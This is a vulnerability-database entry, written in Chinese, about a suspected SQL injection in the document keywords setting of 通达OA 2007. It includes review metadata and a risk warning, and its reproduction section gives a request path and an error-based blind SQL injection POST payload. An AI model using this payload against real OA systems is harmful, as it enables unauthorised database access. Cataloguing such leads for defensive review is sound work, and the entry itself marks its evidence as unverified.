---
source: "hatch 补库批 20260928"
title: "通达OA document keywords SQL 注入线索"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2007声明"
prerequisites: "未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%202007%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-d0fe81e9bf74e51a931c5fa5"
entity_id: "ve-d0fe81e9bf74e51a931c5fa5"
schema_version: "1"
---

# 通达OA document keywords SQL 注入线索

## 条目说明

- 对象与具体问题：通达OA；document keywords SQLi线索
- 版本、配置及部署条件：2007声明
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 仅路由/_SERVER QUERY_STRING片段，无鉴权/响应/根因/修复
- 变量覆盖前提及版本依据缺，0-sec域应占位

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

通达oa 2007

三、复现过程
------------

    http://www.0-sec.org/general/document/index.php/setting/keywords/index

post提交

    _SERVER[QUERY_STRING]=kname=1%2Band@``%2Bor%2Bif(substr(user(),1,4)=root,1,exp(710))#
